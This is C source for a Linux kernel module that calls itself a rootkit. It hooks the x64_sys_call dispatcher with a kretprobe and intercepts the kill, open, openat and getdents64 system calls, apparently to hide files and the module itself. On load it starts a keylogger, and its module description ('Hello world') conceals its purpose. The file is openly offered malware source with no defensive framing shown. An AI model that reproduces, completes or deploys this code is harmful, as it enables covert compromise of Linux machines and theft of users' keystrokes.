#include "hide_file.h"
#include "hide_rootkit.h"
#include "key_logger.h"
#include "rootkit_cmd.h"

#include <linux/file.h>
#include <linux/kprobes.h>
#include <linux/module.h>

struct kretprobe kp;

const int KILL_SYSCALL = 62;
const int OPEN_AT_SYSCALL = 257;
const int OPEN_SYSCALL = 2;
const int GETDENTS64_SYSCALL = 217;

static int syscall_entry(struct kretprobe_instance *k, struct pt_regs *regs) {
  struct pt_regs *syscall_regs = (struct pt_regs *)regs->di;
  struct rootkit_cmd *data = (struct rootkit_cmd *)k->data;
  data->syscall = UNKNOWN;

  int syscall_number = *(int *)&syscall_regs->orig_ax;
  if (syscall_number == KILL_SYSCALL) {
    hide_handler(syscall_regs);
    data->syscall = KILL;
  } else if (syscall_number == OPEN_AT_SYSCALL) {
    char *__user filename = (char *)syscall_regs->si;
    open_enter_handler(filename, data);
    data->syscall = OPEN;
  } else if (syscall_number == OPEN_SYSCALL) {
    char *__user filename = (char *)syscall_regs->di;
    open_enter_handler(filename, data);
    data->syscall = OPEN;
  } else if (syscall_number == GETDENTS64_SYSCALL) {

    data->syscall = GET_DENTS;
    data->data.getdents_data.buf_size = *(unsigned int *)&syscall_regs->dx;
    data->data.getdents_data.entries =
        (struct linux_dirent64 *)syscall_regs->si;
  }

  return 0;
}

static int syscall_exit(struct kretprobe_instance *k, struct pt_regs *regs) {
  struct rootkit_cmd *data = (struct rootkit_cmd *)k->data;

  if (data->syscall == OPEN) {
    open_exit_handler(regs, *data);
  }
  if (data->syscall == GET_DENTS) {
    getdents64_exit_handler(regs, *data);
  }

  // free_rootkit_cmd(*data);
  return 0;
}

static int __init rootkit_enter(void) {
  start_key_logging();

  kp.kp.symbol_name = "x64_sys_call";
  kp.data_size = sizeof(struct rootkit_cmd);
  kp.maxactive = 1000;

  kp.entry_handler = &syscall_entry;
  kp.handler = &syscall_exit;

  if (register_kretprobe(&kp) != 0) {
    printk(KERN_INFO "Failed kprobing on syscall");
  }

  return 0;
}

static void __exit rootkit_exit(void) {
  stop_key_logging();
  unregister_kretprobe(&kp);

  printk(KERN_INFO "Goodbye rootkit unloaded\n");
}

module_init(rootkit_enter);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Itamar");
MODULE_DESCRIPTION("Hello world");
